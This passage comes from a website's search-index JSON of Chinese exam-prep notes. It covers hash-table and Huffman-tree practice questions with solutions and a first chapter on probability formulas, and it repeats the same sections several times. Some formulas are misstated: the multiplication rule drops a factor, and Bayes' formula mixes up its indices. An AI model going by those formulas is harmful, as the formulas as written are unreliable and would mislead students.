Wed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#2-week-4","text":"","title":"2. Week 4"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#21-wed","text":"\u8bbe\u54c8\u5e0c\u8868\u957f\u4e3a14\uff0c\u54c8\u5e0c\u51fd\u6570\u662fH(key)=key%11,\u8868\u4e2d\u5df2\u6709\u6570\u636e\u7684\u5173\u952e\u5b57\u4e3a15,38,61,84\u5171\u56db\u4e2a\uff0c\u73b0\u8981\u5c06\u5173\u952e\u5b57\u4e3a26\u7684\u7ed3\u70b9\u52a0\u5230\u8868\u4e2d\uff0c\u7528\u4e8c\u6b21\u63a2\u6d4b\u518d\u6563\u5217\u6cd5\u89e3\u51b3\u51b2\u7a81\uff0c\u5219\u653e\u5165\u7684\u4f4d\u7f6e\u662f [\u6b66\u6c49\u79d1\u6280\u5927\u5b66-856-2013] A\uff0e8 B\uff0e3 C\uff0e2 D\uff0e9 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1aH(15)=15%11=4 H(38)=38%11 = 5 H(61)=61%11 = 6 H(84)=84%11 = 7 H(26)=26%11=4 \u5173\u952e\u5b5726\u7684\u7ed3\u70b9\u548c\u5173\u952e\u5b57\u4e3a15 \u7684\u7ed3\u70b9\u90fd\u653e\u5728\u54c8\u5e0c\u88684\u7684\u4f4d\u7f6e\uff0c\u4ea7\u751f\u51b2\u7a81 \u5229\u7528\u4e8c\u6b21\u63a2\u6d4b\u518d\u6563\u5217\u6cd5\u516c\u5f0fH(key)=\uff08key+dii\uff09%11 dii=1^2 \uff0c-(1^2)\uff0c2^2\uff0c-(2^2)..... \u5f53dii\u53d61^2\u65f6\uff1a H(26)=\uff0826+1^2\uff09%11 = 5 \u548c H(38)=38%11 =5 \u51b2\u7a81 \u5f53dii\u53d6-1^2\u65f6\uff1aH(26)=\uff0826-(1^2)\uff09%11 = 3 \u4e0d\u4e0e\u5176\u4ed6\u5173\u952e\u5b57\u7684\u54c8\u5e0c\u5730\u5740\u51b2\u7a81\uff0c\u6545\u5c06\u5173\u952e\u5b5726\u7684\u7ed3\u70b9\u653e\u5728\u88683\u4f4d\u7f6e\u3002","title":"2.1. Wed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#22-sun","text":"\u5728\u6709N\u4e2a\u53f6\u5b50\u8282\u70b9\u7684\u54c8\u592b\u66fc\u6811\u4e2d\uff0c\u5176\u8282\u70b9\u603b\u6570\u4e3a [\u90d1\u5dde\u5927\u5b66] A. \u4e0d\u786e\u5b9a B. 2N-1 C. 2N+1 D. 2N \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u54c8\u5f17\u66fc\u6811\u4e5f\u662f\u4e8c\u53c9\u6811\uff0c\u800c\u4e14\u6811\u4e2d\u53ea\u6709\u53f6\u5b50\u7ed3\u70b9\u8ddf\u5ea6\u4e3a2\u7684\u7ed3\u70b9\uff0c\u7531\u4e8c\u53c9\u6811\u7684\u6027\u8d28\u53ef\u5f97\uff1a\u5ea6\u4e3a2\u7684\u7ed3\u70b9\u6570\u91cf\u7b49\u4e8e\u53f6\u5b50\u7ed3\u70b9\u6570\u91cf-1\uff0c\u56e0\u6b64\u7ed3\u70b9\u603b\u6570\u4e3an+n-1\u3002","title":"2.2. Sun"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/","text":"\u7b2c\u4e00\u7ae0_\u968f\u673a\u4e8b\u4ef6\u4e0e\u6982\u7387 # \u76ee\u5f55 # \u7b2c\u4e00\u7ae0_\u968f\u673a\u4e8b\u4ef6\u4e0e\u6982\u7387 \u76ee\u5f55 1. \u968f\u673a\u4e8b\u4ef6\u3001\u4e8b\u4ef6\u95f4\u7684\u5173\u7cfb\u4e0e\u8fd0\u7b97 1.1. \u968f\u673a\u4e8b\u4ef6 1.2. \u4e8b\u4ef6\u7684\u5173\u7cfb\u4e0e\u8fd0\u7b97 2. \u6982\u7387\u53ca\u6982\u7387\u516c\u5f0f 2.1. \u6982\u7387\u516c\u7406 2.2. \u4e8b\u4ef6\u7684\u72ec\u7acb\u6027 2.3. \u4e94\u5927\u6982\u7387\u516c\u5f0f 2.3.1. \u52a0\u6cd5\u516c\u5f0f 2.3.2. \u51cf\u6cd5\u516c\u5f0f 2.3.3. \u4e58\u6cd5\u516c\u5f0f 2.3.4. \u5168\u6982\u7387\u516c\u5f0f 2.3.5. \u8d1d\u53f6\u65af\u516c\u5f0f 3. \u53e4\u5178\u6982\u578b\u4e0e\u4f2f\u52aa\u5229\u6982\u578b 3.1. \u4e8c\u9879\u6982\u7387\u516c\u5f0f 4. \u8865\u5145\u9605\u8bfb 4.1. \u6392\u5217\u7ec4\u5408\u516c\u5f0f 4.2. \u5e38\u7528\u7ec4\u5408\u516c\u5f0f 5. \u603b\u7ed3 1. \u968f\u673a\u4e8b\u4ef6\u3001\u4e8b\u4ef6\u95f4\u7684\u5173\u7cfb\u4e0e\u8fd0\u7b97 # 1.1. \u968f\u673a\u4e8b\u4ef6 # \u5b9a\u4e49 \u968f\u673a\u5b9e\u9a8c\u7684\u6bcf\u4e00\u53ef\u80fd\u7ed3\u679c\u79f0\u4e3a \u6837\u672c\u70b9 \uff0c\u8bb0\u505a \\omega \uff0c\u7531\u6240\u6709\u6837\u672c\u70b9\u5168\u4f53\u7ec4\u6210\u7684\u96c6\u5408\u79f0\u4e3a \u6837\u672c\u7a7a\u95f4 \uff0c\u8bb0\u4f5c \\Omega . 1.2. \u4e8b\u4ef6\u7684\u5173\u7cfb\u4e0e\u8fd0\u7b97 # \u4e8b\u4ef6\u7684\u8fd0\u7b97\u89c4\u5f8b \u4ea4\u6362\u5f8b \u7ed3\u5408\u5f8b \u5206\u914d\u5f8b \u5bf9\u5076\u5f8b \\overline {A \\cup B} = \\overline {A} \\cap \\overline {B} \\overline {A \\cap B} = \\overline {A} \\cup \\overline {B} \\overline {A - B} = \\overline {{A} \\cap \\overline {B}} = \\overline {A} \\cup B \\overline {A \\supset B} = \\overline {A} \\subset \\overline {B} 2. \u6982\u7387\u53ca\u6982\u7387\u516c\u5f0f # 2.1. \u6982\u7387\u516c\u7406 # 2.2. \u4e8b\u4ef6\u7684\u72ec\u7acb\u6027 # \u5b9a\u4e49\uff1a \u8bbe A, B \u4e24\u4e8b\u4ef6\u6ee1\u8db3\u7b49\u5f0f P(AB) = P(A)P(B) \u5219\u79f0 A \u548c B \u76f8\u4e92\u72ec\u7acb\u3002 \u8bbe\u4e8b\u4ef6 A, B, C \u4e09\u4e8b\u4ef6\u6ee1\u8db3\u7b49\u5f0f P(AB) = P(A)P(B) P(AC) = P(A)P(C) P(BC) = P(B)P(C) P(ABC) = P(A)P(B)P(C) \u5219\u79f0 A, B, C \u4e09\u4e8b\u4ef6\u76f8\u4e92\u72ec\u7acb\uff0c \u6ee1\u8db3\u4ee5\u4e0a\u56db\u7b49\u5f0f\u4e2d\u524d\u4e09\u4e2a\u5219\u79f0 A, B, C \u4e09\u4e8b\u4ef6\u4e24\u4e24\u72ec\u7acb\u3002 2.3. \u4e94\u5927\u6982\u7387\u516c\u5f0f # 2.3.1. \u52a0\u6cd5\u516c\u5f0f # P(A \\cup B) = P(A) + P(B) - P(AB) \\begin{aligned} P(A \\cup B \\cup C) =& P(A) + P(B) + P(C) \\\\ &- P(AB) - P(BC) - P(AC) + P(ABC) \\\\ \\end{aligned} 2.3.2. \u51cf\u6cd5\u516c\u5f0f # P(A - B) = P(A) - P(AB) 2.3.3. \u4e58\u6cd5\u516c\u5f0f # \u5f53 P(A) > 0 \u65f6 P(AB) = P(A|B) P(ABC) = P(A) P(B|A) P(C|AB) \u5f53 P(A_1 A_2 \\cdots A_{n})>0 \u65f6\uff0c P(A_1 A_2 \\cdots A_{n}) = P(A_1) P(A_2 | A_1) \\cdots P(A_{n} | A_1 A_2 \\cdots A_{n - 1}) 2.3.4. \u5168\u6982\u7387\u516c\u5f0f # \u5b9a\u4e49 \uff1a\u8bbe B_1, B_2, \\cdots B_{n} \u6ee1\u8db3 \\displaystyle\\bigcup_{i=1}^n B_i = \\Omega,B_i B_j = \\varnothing (i \\ne j) \u4e14 P(B_k) > 0, k = 1, 2, \\cdots, n \uff0c \u5219\u5bf9\u4efb\u610f\u4e8b\u4ef6 A \u6709 P(A) = \\sum_{i = 1}^{n} P(B_i) P(A | B_i) \u8bc1\u660e \uff1a \u6839\u636e\u6761\u4ef6\u5f97 B \u4e3a \\Omega \u7684\u4e00\u4e2a\u5212\u5206\uff0c\u5219 A = A B_1 \\cup A B_2 \\cup \\cdots \\cup A B_n \u4e14 AB_i \u4e0e AB_j \u4e0d\u76f8\u5bb9\uff0c\u6240\u4ee5 P(A) = \\sum_{i = 1}^{n} P(AB_i) = \\sum_{i = 1}^{n} P(B_i) P(A | B_i) \u516c\u5f0f\u5f97\u8bc1 2.3.5. \u8d1d\u53f6\u65af\u516c\u5f0f # \u8bbe B_1, B_2, \\cdots B_{n} \u6ee1\u8db3 \\displaystyle\\bigcup_{i=1}^n B_i = \\Omega,B_i B_j = \\varnothing (i \\ne j) \u4e14 P(A) > 0, P(B_k) > 0, k = 1, 2, \\cdots, n \uff0c \u5219 P(B_i | A) = \\frac{P(B_j) P(A | B_j)}{\\sum_{i = 1}^{n} P(B_i) P(A | B_i)}, j = 1, 2, \\cdots, n \u6ce81\uff1a\u6982\u7387\u8ba1\u7b97\u4e2d\u5e38\u8981\u7ed3\u5408\u5bf9\u5076\u5f8b\u5e94\u7528\u6027\u8d28 P(\\overline{A}) = 1 - P(A) \u6ce82\uff1a A \u548c B \u76f8\u4e92\u72ec\u7acb\u65f6 P(A \\cup B) = 1 - P(\\overline{A} \\cdot \\overline{B}) = 1 - P(\\overline{A}) P(\\overline{B}) P(A - B) = P(A \\overline{B}) = P(A) P(\\overline{B}) 3. \u53e4\u5178\u6982\u578b\u4e0e\u4f2f\u52aa\u5229\u6982\u578b # 3.1. \u4e8c\u9879\u6982\u7387\u516c\u5f0f # \u4f2f\u52aa\u5229\u5b9e\u9a8c : \u5982\u679c\u6bcf\u6b21\u5b9e\u9a8c\u53ea\u6709\u4e24\u4e2a\u7ed3\u679c A \u548c \\overline{A} \uff0c\u5219\u8fd9\u79cd\u5b9e\u9a8c\u4e3a\u4f2f\u52aa\u5229\u5b9e\u9a8c\uff0c\u5c06\u4f2f\u52aa\u5229\u5b9e\u9a8c\u72ec\u7acb\u91cd\u590d\u8fdb\u884c n \u6b21\uff0c\u6210\u4e3a n \u91cd\u4f2f\u52aa\u5229\u5b9e\u9a8c\u3002 \u4e8c\u9879\u5f0f\u6982\u7387\u516c\u5f0f : \u8bbe\u5728\u6bcf\u6b21\u5b9e\u9a8c\u4e2d\uff0c\u6982\u7387 P(A) = p(0<p<1) \uff0c\u5219\u5728 n \u91cd\u4f2f\u52aa\u5229\u5b9e\u9a8c\u4e2d\u4e8b\u4ef6 A \u53d1\u751f k \u6b21\u7684\u6982\u7387\uff0c\u53c8\u79f0\u4e3a\u4e8c\u9879\u5f0f\u6982\u7387\u516c\u5f0f C_n^k p^k (1-p)^{n-k},k = 0, 1, 2, \\cdots,n 4. \u8865\u5145\u9605\u8bfb # 4.1. \u6392\u5217\u7ec4\u5408\u516c\u5f0f # \u6392\u5217\u516c\u5f0f P_n^m = \\frac{n!}{(n - m)!} = n(n - 1)\\cdots(n - m + 1) \u7ec4\u5408\u516c\u5f0f C_n^m = \\begin{pmatrix} n \\\\ m \\end{pmatrix} = \\frac{n!}{m!(n - m)!} = \\frac{P_n^m}{m!} 4.2. \u5e38\u7528\u7ec4\u5408\u516c\u5f0f # C_n^k = C_n^{n - k} C_{n + 1}^{k} = C_n^k + C_n^{k - 1} \\sum_{i = 0}^n C_n^i = 2^n C_{n + m}^k = \\sum_{i = 0}^k C_n^i C_m^{k - i} 5. \u603b\u7ed3 #","title":"1.\u7b2c\u4e00\u7ae0 \u968f\u673a\u4e8b\u4ef6\u4e0e\u6982\u7387"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#_","text":"","title":"\u7b2c\u4e00\u7ae0_\u968f\u673a\u4e8b\u4ef6\u4e0e\u6982\u7387"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#_1","text":"\u7b2c\u4e00\u7ae0_\u968f\u673a\u4e8b\u4ef6\u4e0e\u6982\u7387 \u76ee\u5f55 1. \u968f\u673a\u4e8b\u4ef6\u3001\u4e8b\u4ef6\u95f4\u7684\u5173\u7cfb\u4e0e\u8fd0\u7b97 1.1. \u968f\u673a\u4e8b\u4ef6 1.2. \u4e8b\u4ef6\u7684\u5173\u7cfb\u4e0e\u8fd0\u7b97 2. \u6982\u7387\u53ca\u6982\u7387\u516c\u5f0f 2.1. \u6982\u7387\u516c\u7406 2.2. \u4e8b\u4ef6\u7684\u72ec\u7acb\u6027 2.3. \u4e94\u5927\u6982\u7387\u516c\u5f0f 2.3.1. \u52a0\u6cd5\u516c\u5f0f 2.3.2. \u51cf\u6cd5\u516c\u5f0f 2.3.3. \u4e58\u6cd5\u516c\u5f0f 2.3.4. \u5168\u6982\u7387\u516c\u5f0f 2.3.5. \u8d1d\u53f6\u65af\u516c\u5f0f 3. \u53e4\u5178\u6982\u578b\u4e0e\u4f2f\u52aa\u5229\u6982\u578b 3.1. \u4e8c\u9879\u6982\u7387\u516c\u5f0f 4. \u8865\u5145\u9605\u8bfb 4.1. \u6392\u5217\u7ec4\u5408\u516c\u5f0f 4.2. \u5e38\u7528\u7ec4\u5408\u516c\u5f0f 5. \u603b\u7ed3","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#1","text":"","title":"1. \u968f\u673a\u4e8b\u4ef6\u3001\u4e8b\u4ef6\u95f4\u7684\u5173\u7cfb\u4e0e\u8fd0\u7b97"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#11","text":"\u5b9a\u4e49 \u968f\u673a\u5b9e\u9a8c\u7684\u6bcf\u4e00\u53ef\u80fd\u7ed3\u679c\u79f0\u4e3a \u6837\u672c\u70b9 \uff0c\u8bb0\u505a \\omega \uff0c\u7531\u6240\u6709\u6837\u672c\u70b9\u5168\u4f53\u7ec4\u6210\u7684\u96c6\u5408\u79f0\u4e3a \u6837\u672c\u7a7a\u95f4 \uff0c\u8bb0\u4f5c \\Omega .","title":"1.1. \u968f\u673a\u4e8b\u4ef6"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#12","text":"\u4e8b\u4ef6\u7684\u8fd0\u7b97\u89c4\u5f8b \u4ea4\u6362\u5f8b \u7ed3\u5408\u5f8b \u5206\u914d\u5f8b \u5bf9\u5076\u5f8b \\overline {A \\cup B} = \\overline {A} \\cap \\overline {B} \\overline {A \\cap B} = \\overline {A} \\cup \\overline {B} \\overline {A - B} = \\overline {{A} \\cap \\overline {B}} = \\overline {A} \\cup B \\overline {A \\supset B} = \\overline {A} \\subset \\overline {B}","title":"1.2. \u4e8b\u4ef6\u7684\u5173\u7cfb\u4e0e\u8fd0\u7b97"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#2","text":"","title":"2. \u6982\u7387\u53ca\u6982\u7387\u516c\u5f0f"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#21","text":"","title":"2.1. \u6982\u7387\u516c\u7406"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#22","text":"\u5b9a\u4e49\uff1a \u8bbe A, B \u4e24\u4e8b\u4ef6\u6ee1\u8db3\u7b49\u5f0f P(AB) = P(A)P(B) \u5219\u79f0 A \u548c B \u76f8\u4e92\u72ec\u7acb\u3002 \u8bbe\u4e8b\u4ef6 A, B, C \u4e09\u4e8b\u4ef6\u6ee1\u8db3\u7b49\u5f0f P(AB) = P(A)P(B) P(AC) = P(A)P(C) P(BC) = P(B)P(C) P(ABC) = P(A)P(B)P(C) \u5219\u79f0 A, B, C \u4e09\u4e8b\u4ef6\u76f8\u4e92\u72ec\u7acb\uff0c \u6ee1\u8db3\u4ee5\u4e0a\u56db\u7b49\u5f0f\u4e2d\u524d\u4e09\u4e2a\u5219\u79f0 A, B, C \u4e09\u4e8b\u4ef6\u4e24\u4e24\u72ec\u7acb\u3002","title":"2.2. \u4e8b\u4ef6\u7684\u72ec\u7acb\u6027"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#23","text":"","title":"2.3. \u4e94\u5927\u6982\u7387\u516c\u5f0f"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#231","text":"P(A \\cup B) = P(A) + P(B) - P(AB) \\begin{aligned} P(A \\cup B \\cup C) =& P(A) + P(B) + P(C) \\\\ &- P(AB) - P(BC) - P(AC) + P(ABC) \\\\ \\end{aligned}","title":"2.3.1. \u52a0\u6cd5\u516c\u5f0f"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#232","text":"P(A - B) = P(A) - P(AB)","title":"2.3.2. \u51cf\u6cd5\u516c\u5f0f"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#233","text":"\u5f53 P(A) > 0 \u65f6 P(AB) = P(A|B) P(ABC) = P(A) P(B|A) P(C|AB) \u5f53 P(A_1 A_2 \\cdots A_{n})>0 \u65f6\uff0c P(A_1 A_2 \\cdots A_{n}) = P(A_1) P(A_2 | A_1) \\cdots P(A_{n} | A_1 A_2 \\cdots A_{n - 1})","title":"2.3.3. \u4e58\u6cd5\u516c\u5f0f"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#234","text":"\u5b9a\u4e49 \uff1a\u8bbe B_1, B_2, \\cdots B_{n} \u6ee1\u8db3 \\displaystyle\\bigcup_{i=1}^n B_i = \\Omega,B_i B_j = \\varnothing (i \\ne j) \u4e14 P(B_k) > 0, k = 1, 2, \\cdots, n \uff0c \u5219\u5bf9\u4efb\u610f\u4e8b\u4ef6 A \u6709 P(A) = \\sum_{i = 1}^{n} P(B_i) P(A | B_i) \u8bc1\u660e \uff1a \u6839\u636e\u6761\u4ef6\u5f97 B \u4e3a \\Omega \u7684\u4e00\u4e2a\u5212\u5206\uff0c\u5219 A = A B_1 \\cup A B_2 \\cup \\cdots \\cup A B_n \u4e14 AB_i \u4e0e AB_j \u4e0d\u76f8\u5bb9\uff0c\u6240\u4ee5 P(A) = \\sum_{i = 1}^{n} P(AB_i) = \\sum_{i = 1}^{n} P(B_i) P(A | B_i) \u516c\u5f0f\u5f97\u8bc1","title":"2.3.4. \u5168\u6982\u7387\u516c\u5f0f"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#235","text":"\u8bbe B_1, B_2, \\cdots B_{n} \u6ee1\u8db3 \\displaystyle\\bigcup_{i=1}^n B_i = \\Omega,B_i B_j = \\varnothing (i \\ne j) \u4e14 P(A) > 0, P(B_k) > 0, k = 1, 2, \\cdots, n \uff0c \u5219 P(B_i | A) = \\frac{P(B_j) P(A | B_j)}{\\sum_{i = 1}^{n} P(B_i) P(A | B_i)}, j = 1, 2, \\cdots, n \u6ce81\uff1a\u6982\u7387\u8ba1\u7b97\u4e2d\u5e38\u8981\u7ed3\u5408\u5bf9\u5076\u5f8b\u5e94\u7528\u6027\u8d28 P(\\overline{A}) = 1 - P(A) \u6ce82\uff1a A \u548c B \u76f8\u4e92\u72ec\u7acb\u65f6 P(A \\cup B) = 1 - P(\\overline{A} \\cdot \\overline{B}) = 1 - P(\\overline{A}) P(\\overline{B}) P(A - B) = P(A \\overline{B}) = P(A) P(\\overline{B})","title":"2.3.5. \u8d1d\u53f6\u65af\u516c\u5f0f"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#3","text":"","title":"3. \u53e4\u5178\u6982\u578b\u4e0e\u4f2f\u52aa\u5229\u6982\u578b"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#31","text":"\u4f2f\u52aa\u5229\u5b9e\u9a8c : \u5982\u679c\u6bcf\u6b21\u5b9e\u9a8c\u53ea\u6709\u4e24\u4e2a\u7ed3\u679c A \u548c \\overline{A} \uff0c\u5219\u8fd9\u79cd\u5b9e\u9a8c\u4e3a\u4f2f\u52aa\u5229\u5b9e\u9a8c\uff0c\u5c06\u4f2f\u52aa\u5229\u5b9e\u9a8c\u72ec\u7acb\u91cd\u590d\u8fdb\u884c n \u6b21\uff0c\u6210\u4e3a n \u91cd\u4f2f\u52aa\u5229\u5b9e\u9a8c\u3002 \u4e8c\u9879\u5f0f\u6982\u7387\u516c\u5f0f : \u8bbe\u5728\u6bcf\u6b21\u5b9e\u9a8c\u4e2d\uff0c\u6982\u7387 P(A) = p(0<p<1) \uff0c\u5219\u5728 n \u91cd\u4f2f\u52aa\u5229\u5b9e\u9a8c\u4e2d\u4e8b\u4ef6 A \u53d1\u751f k \u6b21\u7684\u6982\u7387\uff0c\u53c8\u79f0\u4e3a\u4e8c\u9879\u5f0f\u6982\u7387\u516c\u5f0f C_n^k p^k (1-p)^{n-k},k = 0, 1, 2, \\cdots,n","title":"3.1. \u4e8c\u9879\u6982\u7387\u516c\u5f0f"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#4","text":"","title":"4. \u8865\u5145\u9605\u8bfb"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#41","text":"\u6392\u5217\u516c\u5f0f P_n^m = \\frac{n!}{(n - m)!} = n(n - 1)\\cdots(n - m + 1) \u7ec4\u5408\u516c\u5f0f C_n^m = \\begin{pmatrix} n \\\\ m \\end{pmatrix} = \\frac{n!}{m!(n - m)!} = \\frac{P_n^m}{m!}","title":"4.1. \u6392\u5217\u7ec4\u5408\u516c\u5f0f"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#42","text":"C_n^k = C_n^{n - k} C_{n + 1}^{k} = C_n^k + C_n^{k - 1} \\sum_{i = 0}^n C_n^i = 2^n C_{n + m}^k = \\sum_{i = 0}^k C_n^i C_m^{k - i}","title":"4.2. \u5e38\u7528\u7ec4\u5408\u516c\u5f0f"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#5","text":"","title":"5. 